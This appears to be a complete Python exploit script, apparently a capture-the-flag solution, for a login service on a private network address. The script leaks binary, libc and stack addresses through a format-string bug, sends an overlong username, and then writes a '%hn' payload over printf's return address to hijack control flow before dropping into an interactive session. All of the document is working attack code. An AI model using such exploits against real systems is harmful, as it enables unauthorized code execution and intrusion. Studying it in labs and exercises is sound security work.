import socket
import struct
import time
import telnetlib

def p(x):
    return struct.pack('<Q', x)

def up(x):
    return struct.unpack('<Q', x)[0]

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

def read_menu(f):
	readuntil(f, 'choice: ')

host = '192.168.165.136'
port = 1338

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
f = s.makefile('rw', bufsize=0)

raw_input('wait')

readuntil(f, 'Login: ')
f.write('guest\n')
readuntil(f, 'Password: ')
f.write('guest123\n')

read_menu(f)
f.write('2\n')
readuntil(f, 'new username:\n')
f.write('A' * 256 + '\n')

read_menu(f)
f.write('4\n')

readuntil(f, 'Login: ')
f.write('%1$lx.%79$lx.%74$lx' + '\n')
readuntil(f, 'Password: ')
f.write('1\n')

recv = readuntil(f, ' login failed.')
recv = recv.split('.')
binary_base = int(recv[0], 16) - 0x13f2
libc_base = int(recv[1], 16) - 0x21ec5
rbp = int(recv[2], 16)

print 'binary_base: %s' % hex(binary_base)
print 'libc_base: %s' % hex(libc_base)

printf_ret = rbp - 0x248
print 'ret: %s' % hex(printf_ret)

ret1 = printf_ret
value = binary_base + 0xf63
value = value & 0xffff

payload = '%' + str(value) + 'c%10$hn'
payload = payload.ljust(16, 'A')
payload += p(printf_ret)

print payload
assert('\x0a' not in payload)

raw_input('wait')

readuntil(f, 'Login: ')
f.write(payload + '\n')
readuntil(f, 'Password: ')
f.write('1\n')

t = telnetlib.Telnet()
t.sock = s
t.interact()
